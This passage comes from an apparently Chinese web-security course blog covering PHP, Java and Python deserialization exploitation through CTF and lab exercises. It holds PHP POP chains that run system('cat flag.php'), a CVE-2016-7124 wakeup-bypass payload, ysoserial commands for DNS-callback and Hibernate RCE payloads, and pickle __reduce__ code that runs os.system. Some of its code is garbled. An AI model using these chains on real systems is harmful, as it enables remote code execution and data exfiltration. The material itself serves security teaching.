class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;x&#x27;</span>;<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;y&#x27;</span>;<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;则传参username=x&amp;password=y,</span><br><span class="line">并且反序列化后使得<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)为真，isvip为ture。并且username不等于password。</span><br></pre></td></tr></table></figure>

<h6 id="257-反序列化参数修改-对象调用逻辑"><a href="#257-反序列化参数修改-对象调用逻辑" class="headerlink" title="257-反序列化参数修改&amp;对象调用逻辑"></a>257-反序列化参数修改&amp;对象调用逻辑</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">  	&#125;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span>(</span></span><br><span class="line"><span class="class"><span class="title">private</span> $<span class="title">code</span>=&#x27;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">f</span>*&quot;);&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">b</span>=<span class="title">new</span> <span class="title">ctfshowUser</span>();</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">b</span>)</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">思路：分析代码并没有输出<span class="title">flag</span>的地方，但是存在<span class="title">eval</span>()函数,此函数在反序列化中常被用来<span class="title">RCE</span>，</span></span><br><span class="line"><span class="class">因此试图构造<span class="title">pop</span>链--</span></span><br><span class="line"><span class="class">首先通过<span class="title">new</span> 对象来调用<span class="title">__construct</span>()魔术方法</span></span><br><span class="line"><span class="class">--通过魔术方法调用<span class="title">backDoor</span>方法（此处要修改<span class="title">class</span>的值为<span class="title">bankDoor</span>）</span></span><br><span class="line"><span class="class">--修改<span class="title">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();（因为<span class="title">backDoor</span>中$<span class="title">code</span>为私有所以需要新建 <span class="title">backDoor</span>才能调用）</span></span><br><span class="line"><span class="class">--然后修改$<span class="title">code</span>的变量值为&quot;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">flag</span>.<span class="title">php</span>&quot;);&quot;;构造完成</span></span><br><span class="line"><span class="class">--传入正确的参数，修改数据包中<span class="title">cookie</span>字段反序列化<span class="title">RCE</span>执行</span></span><br></pre></td></tr></table></figure>

<h6 id="258-反序列化参数修改-对象调用逻辑"><a href="#258-反序列化参数修改-对象调用逻辑" class="headerlink" title="258-反序列化参数修改&amp;对象调用逻辑"></a>258-反序列化参数修改&amp;对象调用逻辑</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：代码逻辑基本和上一关相似，只是增加了正则过滤,通过替换语句将数字替换成+数字，即可绕过。</span><br><span class="line">比如原来序列化后的对象中含有<span class="number">8</span>，替换为+<span class="number">8</span></span><br><span class="line">/[oc]:\d+:/i，其中 / 表示正则表达式的开始和结束，[oc] 表示匹配字符集中的一个字符，</span><br><span class="line">即 o 或 c，\d+ 表示匹配一个或多个数字字符，即 <span class="number">0</span> 到 <span class="number">9</span>，: 表示匹配冒号字符。</span><br><span class="line">因此，该正则表达式的含义是匹配以 o: 或 c: 开头、后面跟着一串数字和冒号的字符串。</span><br><span class="line">i 表示忽略大小写，即 o 和 c 可以是大写或小写字母。</span><br></pre></td></tr></table></figure>

<h6 id="259-原生态类8Call魔术方法8配台SSRF"><a href="#259-原生态类8Call魔术方法8配台SSRF" class="headerlink" title="259-原生态类8Call魔术方法8配台SSRF"></a>259-原生态类8Call魔术方法8配台SSRF</h6><p>参考链接：<a href="https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a><br>思路：大概是观察给出的js代码和flag.php 发现存在一个没有被调用的函数，所以想到用php中的原生类调用。<br>目的是在index.php通过反序列化一个原生类向flag.php发送请求，然后flag.php用file_put_contents把flag放到flag.txt里。发请求用的是php里的一个内置类：SoapClient,这个类中有个__call魔术方法,当调用一个对象中不存在的方法时候，会执行call()魔术方法。来达到我们伪造请求头的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow的大部分php反序列题目我也都做了，可以直接去看写的wp文章可能会更详细一点。</span><br></pre></td></tr></table></figure>

<h1 id="第46天：WEB攻防-通用漏洞-PHP反序列化-原生类-漏洞绕过-公私有属性"><a href="#第46天：WEB攻防-通用漏洞-PHP反序列化-原生类-漏洞绕过-公私有属性" class="headerlink" title="第46天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"></a>第46天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</h1><h4 id="知识点：-26"><a href="#知识点：-26" class="headerlink" title="知识点："></a>知识点：</h4><p>1、反序列化魔术方法全解<br>2、反序列化变量属性全解<br>3、反序列化魔术方法原生类<br>4、反序列化语言特性漏洞绕过</p>
<p>~其他魔术方法</p>
<p>共有&amp;私有&amp;保护<br>语言模式方法漏洞<br>~原生类获取利用配合</p>
<h4 id="反序列化利用大概分类三类"><a href="#反序列化利用大概分类三类" class="headerlink" title="#反序列化利用大概分类三类"></a>#反序列化利用大概分类三类</h4><p>-魔术方法的调用逻辑如触发条件<br>-语言原生类的调用逻辑如SoapClient<br>-语言自身的安全缺陷如CVE-2016-7124</p>
<h4 id="反序列化课程点：-1"><a href="#反序列化课程点：-1" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h4><p>-PHP&amp;Java&amp;Python</p>
<p>PHP魔术方法再来一遍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//构造函数，当对象new的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//析构函数当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span></span><br></pre></td></tr></table></figure>

<h4 id="演示案例：-23"><a href="#演示案例：-23" class="headerlink" title="演示案例："></a>演示案例：</h4><p>方法&amp;属性-调用详解&amp;变量数据详解<br>CTF-语言漏洞-wakeup方法绕过<br>CTF-方法原生类获取&amp;利用&amp;配合其他</p>
<h4 id="方法-属性-调用详解-变量数据详解"><a href="#方法-属性-调用详解-变量数据详解" class="headerlink" title="#方法&amp;属性-调用详解&amp;变量数据详解"></a>#方法&amp;属性-调用详解&amp;变量数据详解</h4><p>对象变量属性：<br>public（公共的）在本类内部、外部类、子类都可以访问<br>protect（受保护的）只有本类或子类或父类中可以访问<br>private(私人的）只有本类内部可以使用<br>序列化数据显示：<br>private属性序列化的时候格式是%00类名%00成员名<br>protect属性序列化的时候格式是%00*%00成员名</p>
<h4 id="CTF语言漏洞-wakeup（）方法绕过"><a href="#CTF语言漏洞-wakeup（）方法绕过" class="headerlink" title="#CTF语言漏洞-wakeup（）方法绕过"></a>#CTF语言漏洞-wakeup（）方法绕过</h4><p>极客大挑战20191 PHP CVE2016-7124</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果存在wakeup方法，调用<span class="title function_ invoke__">unserilize</span>(O方法前则先调用wakeup方法，</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</span><br><span class="line"><span class="number">1</span>、下载源码分析，触发flag条件</span><br><span class="line"><span class="number">2</span>、分析会缺发调用wakeup强制username值</span><br><span class="line"><span class="number">3</span>、利用语言漏洞绕过CVE-<span class="number">2016</span>-<span class="number">7124</span></span><br><span class="line"><span class="number">4</span>、构造payload后修改满足漏洞条件发</span><br><span class="line">Pyload</span><br><span class="line">select=<span class="number">0</span>%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Name&quot;</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">00</span>Name%<span class="number">00</span>username<span class="string">&quot;%3Bs</span></span><br><span class="line"><span class="string">%3A5%3A&quot;</span>admin<span class="string">&quot;%3Bs%3A14%3A%00Name%00password&quot;</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br><span class="line">思路：通过文件目录扫描出www.zip文件，文件中含有网站源代码，观察网站源码发现要想获得flag需要</span><br><span class="line">password=<span class="number">100</span>&amp;username=admin，同时并未给出传参的位置，</span><br><span class="line">所以需要利用反序列化构造username和password，</span><br><span class="line">但是在利用<span class="title function_ invoke__">unserialize</span>()函数的时候会自动调用<span class="title function_ invoke__">__wakeup</span>()魔术方面把username修改，</span><br><span class="line">所以思考要跳过<span class="title function_ invoke__">__wakeiup</span>()魔术方法，就需要利用CVE-<span class="number">2016</span>-<span class="number">7124</span>漏洞。</span><br><span class="line">影响版本：PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span>；PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br><span class="line">漏洞原因：如果存在__wakeup方法，调用 <span class="title function_ invoke__">unserilize</span>() 方法前则先调用__wakeup方法，</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</span><br><span class="line">构造链：</span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="keyword">class</span> Name&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果后修改属性个数大于真实属性个数即可，然后传参带入即可。</span><br></pre></td></tr></table></figure>

<h4 id="CTF-方法原生类获取-利用-配合其他"><a href="#CTF-方法原生类获取-利用-配合其他" class="headerlink" title="CTF-方法原生类获取&amp;利用&amp;配合其他"></a>CTF-方法原生类获取&amp;利用&amp;配合其他</h4><h5 id="此处回顾了ctfshow-259关"><a href="#此处回顾了ctfshow-259关" class="headerlink" title="此处回顾了ctfshow 259关"></a>此处回顾了ctfshow 259关</h5><p>对于这个原生类的知识，主要是从一下三个方面去说明。<br>-PHP有那些原生类-见脚本使用<br>-常见使用的原生类-见参考案例<br>-原生类该怎么使用-见官方说明<br>首先通过网上找的一个小脚本，可以列出每个魔术方法对应的一些原生类。<br>直接访问即可返回原生类（但不全）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"><span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line"></span><br><span class="line">))) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;&#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>本地dome xss</strong></p>
<p>参考链接：<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a><br>思路：通过分析代码传入参数k，最后直接输出对象，此处可以使用__tostring魔术方法，但是代码中并没包含__tostring的对象，所以想到要使用原生类</p>
<h6 id="回顾ctfshow259-利用原生类"><a href="#回顾ctfshow259-利用原生类" class="headerlink" title="回顾ctfshow259 利用原生类"></a><strong>回顾ctfshow259 利用原生类</strong></h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：分析代码存在不存在的函数方法所以i想到利用<span class="title function_ invoke__">__call</span>()魔术方法触发，</span><br><span class="line">但是代码中没有<span class="title function_ invoke__">__call</span>()魔术方法，所以想到使用含有魔术方法的原生类<span class="title function_ invoke__">soapClient</span>()访问flag.php讲flag写入flag.txt，最后读取即可。</span><br><span class="line">flag.php中表明需要本地访问且ua头有限制token=ctfshow方可写入。</span><br></pre></td></tr></table></figure>

<p>将构造的好的链通过参数传入即可将falg写入flag.txt，最后读取flag.txt</p>
<h1 id="第47天-WEB攻防-通用漏洞-Java反序列化-EXP生成-数据提取-组件安全"><a href="#第47天-WEB攻防-通用漏洞-Java反序列化-EXP生成-数据提取-组件安全" class="headerlink" title="第47天 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全"></a>第47天 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</h1><h4 id="知识点：-27"><a href="#知识点：-27" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Java反序列化演示-原生API接☐<br>2、Java反序列化漏洞利用-Ysoserial使用<br>3、Java反序列化漏洞发现利用点-函数&amp;数据<br>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p>
<h4 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h4><p>1、明白Java反序列化原理<br>2、判断Java反序列化漏洞<br>3、学会-Ysoserial_工具使用<br>4、学会-SerializationDumper<br>5、了解-简要Java代码审计分析</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识"></a>#前置知识</h4><p>序列化和反序列化的概念：<br>序列化：把Java对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为Java对象的过程。<br>对象的序列化主要有两种用途：<br>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）<br>在网络上传送对象的字节序列。（网络传输对象）</p>
<blockquote>
<p>尽管 Java 反序列化和 PHP 反序列化在处理对象的序列化和反序列化过程中都存在类似的安全问题，但它们之间还是有一些不同的地方：<br>序列化格式不同：Java 使用了自己的序列化机制来支持对象的序列化和反序列化，而 PHP 通常使用基于文本的序列化格式（如<br>serialize 和 unserialize 函数）进行序列化和反序列化。 序列化器实现方式不同：Java 序列化器实现了<br>Serializable 接口，并通过反射机制获取对象的属性值进行序列化。而 PHP 序列化器没有统一的接口，而是通过魔术方法（如<br>__sleep() 和 __wakeup()）和自定义函数进行序列化和反序列化。 对象类型的检查方式不同：Java 反序列化将对反序列化的对象进行类型检查，并且只会反序列化已知类型的对象。<br>PHP的反序列化器则没有这样的限制，攻击者可以构造序列化数据来欺骗反序列化器。 可重写方法的触发方式不同：Java 反序列化器通过特定的方法（例如readObject()）来触发可重写方法，而 PHP 反序列化器需要在序列化字符串中包含 O:classname: 格式的元信息来实现。<br>综上所述，虽然 Java 反序列化和 PHP 反序列化存在一些不同，但它们都必须小心处理反序列化的输入数据，以避免导致安全漏洞。函数接口：</p>
</blockquote>
<h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java:Serializable Extemalizable接☐、fastjson、jackson、gson、</span><br><span class="line">ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.</span><br><span class="line">ObjectYaml.loadXStream.fromXML.ObjectMapper.readValue.JSON.parseObject</span><br><span class="line">PHP:serialize(）unserialize(）</span><br><span class="line">Python:pickle</span><br></pre></td></tr></table></figure>

<h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：<br>反序列化操作一般应用在导入模板文件、网例络通信、数据传输、日志格式化存储、对象数<br>据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。<br>2、数据特性：<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。<br>3、出现具体：<br>http参数，cookie,sesion,存储方式可能是base64(rO0)，压缩后的base64(H4s),Mll等<br>Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMl,JMS,JND1等<br>(\xac\Xed)xm IXstream,XmldEcoder (http Body:Content-type:application&#x2F;xml)<br>json0 ackson,fastison)http请求中包含</p>
<h4 id="发现："><a href="#发现：" class="headerlink" title="发现："></a>发现：</h4><p>黑盒分析：数据库出现地-观察数据特性<br>白盒分析：组件安全&amp;数搜索&amp;功能模块<br>利用：<br>Ysoserials集成的jar包配合生成，特性的专业漏洞利用工具等</p>
<h4 id="演示案例：-24"><a href="#演示案例：-24" class="headerlink" title="演示案例："></a>演示案例：</h4><p>原生API -Ysoserial URLDNS使用<br>三方组件-Ysoserial支持库生成使用<br>解密分析-SerializationDumper数据分析<br>CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p>
<h4 id="原生API-Ysoserial-URLDNS使用"><a href="#原生API-Ysoserial-URLDNS使用" class="headerlink" title="#原生API-Ysoserial URLDNS使用"></a>#原生API-Ysoserial URLDNS使用</h4><p>Serializable接口<br>Externalizable接口<br>没组件生成DNS利用：<br><a href="https://github/com/frohoff">https://github/com/frohoff</a> ysoserial<br>java -jar ysoserial-0.0.6-SNAPSHOT-all jar URLDNS <a href="http://9ar7xl/">http://9ar7xl</a> anslog.cn”&gt;urldns.ser<br>思路：本地搭建序列化和反序列化操作，使用ysoserial 生成反序列化语句用来访问dnslog并保存到本地，当反序列化执行的对象为构造好的本地文件时，触发访问dnslog，造成信息外带。</p>
<h4 id="三方组件-Ysoserial支持库生成便用"><a href="#三方组件-Ysoserial支持库生成便用" class="headerlink" title="#三方组件-Ysoserial支持库生成便用"></a>#三方组件-Ysoserial支持库生成便用</h4><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>此处讲解了wegooat靶场中Java反序列化关卡，首先通过抓包找到含有反序列化函数处，然后有两种，第一种结合原生类（比如 URLDNS）生成payload，第二种结合原生类hibernate生成payload（结合库文件生成的一般可以执行rce）</p>
<p>先结合库文件利用jar包生成特定payload，此处是利用hibemnate生成了弹出计算器的payload并保存到本地，然后将payload进行base64加密。</p>
<p>有组件生成RCE1、生成：java-Dhibernate5 cp hibemnate-core-5.4.9 Final jar ysoserial-0.0.6-<br>SNAPSHOT-all jar ysoseral.GeneratePayload Hibernate1 “calc.exe”&gt;x bin<br>2、解码：python java.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file <span class="built_in">open</span>(“x <span class="built_in">bin</span>”“rb”)</span><br><span class="line">now flle read（）</span><br><span class="line">ba base64 D64encode(now)</span><br><span class="line"><span class="built_in">print</span> ba</span><br><span class="line">file close</span><br></pre></td></tr></table></figure>

<p>3、CTF赛题—[网鼎杯2020朱雀组]ThinkJava</p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p>
<p>参考链接：<a href="https://blog.csdn.net/RABCDXB/article/details/124003575">https://blog.csdn.net/RABCDXB/article/details/124003575</a></p>
<h1 id="第48天：WEB攻防-通用漏洞-Py反序列化-链构造-自动审计bandit-魔术方法"><a href="#第48天：WEB攻防-通用漏洞-Py反序列化-链构造-自动审计bandit-魔术方法" class="headerlink" title="第48天：WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法"></a>第48天：WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</h1><h4 id="知识点：-28"><a href="#知识点：-28" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Python-反序列化函数使用<br>2、Python-反序列化魔术方法<br>3、Python-反序列化POP链构造<br>4、Python-自动化审计bandit使用</p>
<h4 id="前置知识：-1"><a href="#前置知识：-1" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>函数使用：<br>pickle.dump(obj,file):将对象序列化后保存到文件<br>pickle.load(le):读取文件，将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj):将对象序列化成字符串格式的字节流<br>pickle.loads(bytes obj):将字符串格式的字节流反序列化为对象<br>魔术方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__reduce (__()      反序列化时调用</span><br><span class="line">__reduce__ex__()    反序列化时调用</span><br><span class="line">__setstate__()      反序列化时调用</span><br><span class="line">__getstate__()    序列化时调用</span><br></pre></td></tr></table></figure>

<p>各类语言函数：<br>Java:Serializable Extemalizable接☐、fastison、jackson、gson、<br>ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.<br>ObjectYaml loadXStream.fromXML ObjectMapper.readValue.JSON.parseObject<br>PHP:serialize（）.unserialize（）<br>Python:pickle marshal PyYAML shelve PIL unzip</p>
<h4 id="演示案例：-25"><a href="#演示案例：-25" class="headerlink" title="演示案例："></a>演示案例：</h4><p>原理-反序列化魔术方法-调用理解<br>CTF-反序列化漏洞利用-构造&amp;RCE<br>CTF-CISCN2019华北-JWT&amp;反序列化<br>代码审计-自动化工具-bandit?安装及使用</p>
<h4 id="原理反序列化魔术方法调用理解"><a href="#原理反序列化魔术方法调用理解" class="headerlink" title="#原理反序列化魔术方法调用理解"></a>#原理反序列化魔术方法调用理解</h4><p>魔术方法利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reduce() 反序列化时调用</span><br><span class="line">reduce_ex() 反序列化时调用</span><br><span class="line">setstate() 反序列化时调用</span><br><span class="line">getstate() 序列化时调用</span><br></pre></td></tr></table></figure>

<p>代码块：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"><span class="comment">##__reduce__()方法在序列化和反序列化时都会被调用，其中__reduce__()方法中需要return才能触发。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br><span class="line">反序列化时会调用__setstate__（）方法，__init__() 方法是一个构造函数，它会在创建新对象时自动调用，</span><br><span class="line">并用于初始化对象的状态和成员变量。当我们创建一个类的新实例时，</span><br><span class="line">Python 解释器会自动调用该类的 __init__() 方法，并将实例本身作为第一个参数传递给该方法。</span><br><span class="line">因此，在定义 __init__() 方法时，需要将该方法的第一个参数指定为 self，以便引用当前对象的成员变量。</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">反序列化时自动调用__getstate__()</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#反序列化安全漏洞产生-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.arg = arg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">pickle.loads(p_a) 反序列化该二进制字符串，并触发其中包含的 __reduce__() 方法。</span><br><span class="line">由于该方法中包含了 self.func(*self.arg) 语句，因此在执行反序列化操作时，</span><br><span class="line">Python 解释器会自动调用 os.system(<span class="string">&#x27;calc&#x27;</span>) 函数，并弹出计算器应用程序。</span><br></pre></td></tr></table></figure>

